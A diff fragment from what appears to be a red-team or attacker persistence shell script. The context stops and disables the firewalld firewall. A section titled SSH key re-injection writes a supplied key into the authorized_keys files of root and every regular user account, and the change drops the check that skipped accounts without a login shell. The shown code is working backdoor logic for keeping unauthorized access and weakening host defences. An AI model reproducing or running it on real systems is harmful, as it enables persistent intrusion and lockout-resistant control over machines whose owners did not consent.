@@ -120,7 +120,7 @@ systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null
 
 # -- SSH key re-injection --
 _k="${RT_SSH_KEY}"
-for _h in /root \$(awk -F: '\$3>=1000 && \$7!~/nologin|false/{print \$6}' /etc/passwd); do
+for _h in /root \$(awk -F: '\$3>=1000{print \$6}' /etc/passwd); do
     [[ -d "\$_h" ]] || continue
     mkdir -p "\$_h/.ssh" && chmod 700 "\$_h/.ssh"
     touch "\$_h/.ssh/authorized_keys" && chmod 600 "\$_h/.ssh/authorized_keys"
